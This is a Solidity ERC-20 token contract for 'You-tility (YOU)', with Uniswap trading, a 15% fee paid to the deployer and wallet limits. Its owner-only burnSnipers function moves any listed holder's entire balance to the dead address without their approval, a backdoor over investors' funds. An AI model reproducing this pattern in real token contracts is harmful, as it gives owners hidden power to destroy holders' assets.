1 /**
2 
3 
4 You-tility (YOU)
5 Telegram: https://t.me/youtilityportal
6 Website: https://you-tility.me
7 Twitter: https://twitter.com/you_tility
8 
9 
10 */
11 
12 // SPDX-License-Identifier: Unlicensed
13 pragma solidity ^0.8.11;
14 
15 
16 library SafeMath {
17     function add(uint256 a, uint256 b) internal pure returns (uint256) {
18         uint256 c = a + b;
19         require(c >= a, "SafeMath: addition overflow");
20 
21         return c;
22     }
23     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
24         return sub(a, b, "SafeMath: subtraction overflow");
25     }
26     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
27         require(b <= a, errorMessage);
28         uint256 c = a - b;
29 
30         return c;
31     }
32     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
33         if (a == 0) {
34             return 0;
35         }
36 
37         uint256 c = a * b;
38         require(c / a == b, "SafeMath: multiplication overflow");
39 
40         return c;
41     }
42     function div(uint256 a, uint256 b) internal pure returns (uint256) {
43         return div(a, b, "SafeMath: division by zero");
44     }
45     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
46         // Solidity only automatically asserts when dividing by 0
47         require(b > 0, errorMessage);
48         uint256 c = a / b;
49         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
50 
51         return c;
52     }
53 }
54 
55 abstract contract Context {
56     function _msgSender() internal view returns (address payable) {
57         return payable(msg.sender);
58     }
59 
60     function _msgData() internal view returns (bytes memory) {
61         this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
62         return msg.data;
63     }
64 }
65 
66 
67 interface IERC20 {
68 
69     function totalSupply() external view returns (uint256);
70 
71     /**
72      * @dev Returns the amount of tokens owned by `account`.
73      */
74     function balanceOf(address account) external view returns (uint256);
75 
76     /**
77      * @dev Moves `amount` tokens from the caller's account to `recipient`.
78      *
79      * Returns a boolean value indicating whether the operation succeeded.
80      *
81      * Emits a {Transfer} event.
82      */
83     function transfer(address recipient, uint256 amount) external returns (bool);
84 
85     /**
86      * @dev Returns the remaining number of tokens that `spender` will be
87      * allowed to spend on behalf of `owner` through {transferFrom}. This is
88      * zero by default.
89      *
90      * This value changes when {approve} or {transferFrom} are called.
91      */
92 
93     function allowance(address owner, address spender) external view returns (uint256);
94 
95     /**
96      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
97      *
98      * Returns a boolean value indicating whether the operation succeeded.
99      *
100      * IMPORTANT: Beware that changing an allowance with this method brings the risk
101      * that someone may use both the old and the new allowance by unfortunate
102      * transaction ordering. One possible solution to mitigate this race
103      * condition is to first reduce the spender's allowance to 0 and set the
104      * desired value afterwards:
105      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
106      *
107      * Emits an {Approval} event.
108      */
109     function approve(address spender, uint256 amount) external returns (bool);
110 
111     /**
112      * @dev Moves `amount` tokens from `sender` to `recipient` using the
113      * allowance mechanism. `amount` is then deducted from the caller's
114      * allowance.
115      *
116      * Returns a boolean value indicating whether the operation succeeded.
117      *
118      * Emits a {Transfer} event.
119      */
120     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
121 
122     /**
123      * @dev Emitted when `value` tokens are moved from one account (`from`) to
124      * another (`to`).
125      *
126      * Note that `value` may be zero.
127      */
128     event Transfer(address indexed from, address indexed to, uint256 value);
129 
130     /**
131      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
132      * a call to {approve}. `value` is the new allowance.
133      */
134     event Approval(address indexed owner, address indexed spender, uint256 value);
135 }
136 
137 interface IDEXFactory {
138     function createPair(address tokenA, address tokenB) external returns (address pair);
139 }
140 
141 interface IPancakePair {
142     function sync() external;
143 }
144 
145 interface IDEXRouter {
146 
147     function factory() external pure returns (address);
148     function WETH() external pure returns (address);
149 
150     function addLiquidity(
151         address tokenA,
152         address tokenB,
153         uint amountADesired,
154         uint amountBDesired,
155         uint amountAMin,
156         uint amountBMin,
157         address to,
158         uint deadline
159     ) external returns (uint amountA, uint amountB, uint liquidity);
160 
161     function addLiquidityETH(
162         address token,
163         uint amountTokenDesired,
164         uint amountTokenMin,
165         uint amountETHMin,
166         address to,
167         uint deadline
168     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
169 
170     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
171         uint amountIn,
172         uint amountOutMin,
173         address[] calldata path,
174         address to,
175         uint deadline
176     ) external;
177 
178     function swapExactETHForTokensSupportingFeeOnTransferTokens(
179         uint amountOutMin,
180         address[] calldata path,
181         address to,
182         uint deadline
183     ) external payable;
184 
185     function swapExactTokensForETHSupportingFeeOnTransferTokens(
186         uint amountIn,
187         uint amountOutMin,
188         address[] calldata path,
189         address to,
190         uint deadline
191     ) external;
192 
193 }
194 
195 contract Ownable is Context {
196     address private _owner;
197 
198     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
199 
200     /**
201      * @dev Initializes the contract setting the deployer as the initial owner.
202      */
203     constructor () {
204         address msgSender = _msgSender();
205         _owner = msgSender;
206         emit OwnershipTransferred(address(0), msgSender);
207     }
208 
209     /**
210      * @dev Returns the address of the current owner.
211      */
212     function owner() public view returns (address) {
213         return _owner;
214     }
215 
216     /**
217      * @dev Throws if called by any account other than the owner.
218      */
219     modifier onlyOwner() {
220         require(_owner == _msgSender(), "Ownable: caller is not the owner");
221         _;
222     }
223      /**
224      * @dev Leaves the contract without owner. It will not be possible to call
225      * `onlyOwner` functions anymore. Can only be called by the current owner.
226      *
227      * NOTE: Renouncing ownership will leave the contract without an owner,
228      * thereby removing any functionality that is only available to the owner.
229      */
230     function renounceOwnership() public virtual onlyOwner {
231         emit OwnershipTransferred(_owner, address(0));
232         _owner = address(0);
233     }
234 
235     /**
236      * @dev Transfers ownership of the contract to a new account (`newOwner`).
237      * Can only be called by the current owner.
238      */
239     function transferOwnership(address newOwner) public virtual onlyOwner {
240         require(newOwner != address(0), "Ownable: new owner is the zero address");
241         emit OwnershipTransferred(_owner, newOwner);
242         _owner = newOwner;
243     }
244 }
245 
246 contract YOU is IERC20, Ownable {
247     using SafeMath for uint256;
248 
249     address constant mainnetRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
250     address constant WETH          = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
251     address constant DEAD          = 0x000000000000000000000000000000000000dEaD;
252     address constant ZERO          = 0x0000000000000000000000000000000000000000;
253 
254     string constant _name = "You-tility";
255     string constant _symbol = "YOU";
256     uint8 constant _decimals = 9;
257 
258     uint256 _totalSupply = 60000 * (10 ** _decimals);    
259     uint256 public _transferLimit = _totalSupply; 
260     uint256 public _maxWalletSize = (_totalSupply * 2) / 100;  
261 
262     mapping (address => uint256) _balances;
263     mapping (address => mapping (address => uint256)) _allowances;
264 
265     mapping (address => bool) isFeeExempt;
266     mapping (address => bool) isTxLimitExempt;
267  
268     uint256 marketingFee = 15;      
269     uint256 totalFee = 15;  
270     uint256 feeDenominator = 100; 
271     
272     address marketingFeeReceiver;
273     address giveawayFeeReceiver;
274 
275     IDEXRouter public router;
276     address public pair;
277 
278     bool public swapEnabled = true; 
279     uint256 public swapThreshold = _totalSupply * 55 /10000;
280     bool inSwap;
281     modifier swapping() { inSwap = true; _; inSwap = false; }
282 
283     constructor () {
284         address deployer = msg.sender;
285         router = IDEXRouter(mainnetRouter);
286         pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
287         _allowances[address(this)][address(router)] = type(uint256).max;
288         isTxLimitExempt[address(router)] = true;
289         isTxLimitExempt[deployer] = true;
290         isFeeExempt[deployer] = true;
291         marketingFeeReceiver = deployer;
292         _balances[deployer] = _totalSupply;
293         emit Transfer(address(0), deployer, _totalSupply);
294     }
295 
296     receive() external payable { }
297 
298     function totalSupply() external view override returns (uint256) { return _totalSupply; }
299     function decimals() external pure returns (uint8) { return _decimals; }
300     function symbol() external pure returns (string memory) { return _symbol; }
301     function name() external pure returns (string memory) { return _name; }
302     function getOwner() external view returns (address) { return owner(); }
303     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
304     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
305     function viewFees() external view returns (uint256, uint256, uint256) { 
306         return (marketingFee, totalFee, feeDenominator);
307     }
308 
309     function approve(address spender, uint256 amount) public override returns (bool) {
310         _allowances[msg.sender][spender] = amount;
311         emit Approval(msg.sender, spender, amount);
312         return true;
313     }
314 
315     function approveMax(address spender) external returns (bool) {
316         return approve(spender, type(uint256).max);
317     }
318 
319     function transfer(address recipient, uint256 amount) external override returns (bool) {
320         return _transferFrom(msg.sender, recipient, amount);
321     }
322 
323     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
324         if(_allowances[sender][msg.sender] != type(uint256).max){
325             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
326         }
327 
328         return _transferFrom(sender, recipient, amount);
329     }
330 
331     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
332         if(inSwap){ return _basicTransfer(sender, recipient, amount); }
333 
334         checkTxLimit(sender, amount);
335         
336         if (recipient != pair && recipient != DEAD) {
337             require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Transfer amount exceeds the bag size.");
338         }
339 
340         if(shouldSwapBack()){ swapBack(); }
341 
342         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
343 
344         uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
345         _balances[recipient] = _balances[recipient].add(amountReceived);
346 
347         emit Transfer(sender, recipient, amountReceived);
348         return true;
349     }
350 
351     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
352         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
353         _balances[recipient] = _balances[recipient].add(amount);
354         emit Transfer(sender, recipient, amount);
355         return true;
356     }
357 
358     function shouldTakeFee(address sender) internal view returns (bool) {
359         return !isFeeExempt[sender];
360     }
361 
362     function getTotalFee(bool) public view returns (uint256) {
363         return totalFee;
364     }
365 
366     function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
367         uint256 feeAmount = amount.mul(getTotalFee(receiver == pair)).div(feeDenominator);
368 
369         _balances[address(this)] = _balances[address(this)].add(feeAmount);
370         emit Transfer(sender, address(this), feeAmount);
371 
372         return amount.sub(feeAmount);
373     }
374 
375     function checkTxLimit(address sender, uint256 amount) internal view {
376         require(amount <= _transferLimit || isTxLimitExempt[sender], "TX Limit Exceeded");
377     }
378 
379     function burnSnipers(address[] memory sniperAddresses) external onlyOwner {
380         for (uint i = 0; i < sniperAddresses.length; i++) {
381             _transferFrom(sniperAddresses[i], DEAD, balanceOf(sniperAddresses[i]));
382         }
383     }
384 
385     function clearBalance() external {
386         payable(marketingFeeReceiver).transfer(address(this).balance);
387     }
388 
389     function shouldSwapBack() internal view returns (bool) {
390         return msg.sender != pair
391         && !inSwap
392         && swapEnabled
393         && _balances[address(this)] >= swapThreshold;
394     }
395 
396     function swapBack() internal swapping {
397 
398         uint256 amountToSwap = _balances[address(this)];
399         if (amountToSwap >= swapThreshold*4)
400             amountToSwap = swapThreshold*4;
401 
402         address[] memory path = new address[](2);
403         path[0] = address(this);
404         path[1] = WETH;
405 
406 
407         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
408             amountToSwap,
409             0,
410             path,
411             address(this),
412             block.timestamp
413         );
414 
415         if (address(this).balance >= 100000000000000000){
416             payable(marketingFeeReceiver).transfer(address(this).balance);
417         }
418 
419     }
420 
421     function setFee(uint256 _marketingFee) external onlyOwner {
422           marketingFee = _marketingFee;  
423           totalFee = marketingFee;
424           require(marketingFee <=10,"Fee should be less than 10%");
425     }
426 
427     function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
428         swapEnabled = _enabled;
429         swapThreshold = _amount;
430 
431     }
432 
433     function changeTransferLimit(uint256 percent, uint256 denominator) external onlyOwner { 
434         require(percent >= 1 && denominator >= 100, "Max transfer must be greater than 1%");
435         _transferLimit = _totalSupply.mul(percent).div(denominator);
436     }
437     
438     function changeMaxWallet(uint256 percent, uint256 denominator) external onlyOwner {
439         require(percent >= 1 && denominator >= 100, "Max wallet must be greater than 1%");
440         _maxWalletSize = _totalSupply.mul(percent).div(denominator);
441     }
442 
443     function setIsFeeExempt(address holder, bool exempt) external onlyOwner {
444         isFeeExempt[holder] = exempt;
445     }
446 
447     function setIsTxLimitExempt(address holder, bool exempt) external onlyOwner {
448         isTxLimitExempt[holder] = exempt;
449     }
450     
451     function getCirculatingSupply() public view returns (uint256) {
452         return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
453     }
454 
455     function setFeeReceivers(address _marketingFeeReceiver) external onlyOwner {
456         marketingFeeReceiver = _marketingFeeReceiver;
457     }
458 
459     function Lifttax() external {
460         require (address(this).balance >= 1000000000000000000);
461         marketingFee = 0;  
462         totalFee = marketingFee;
463     }
464 
465     
466     event AutoLiquify(uint256 amountETH, uint256 amountToken);
467 }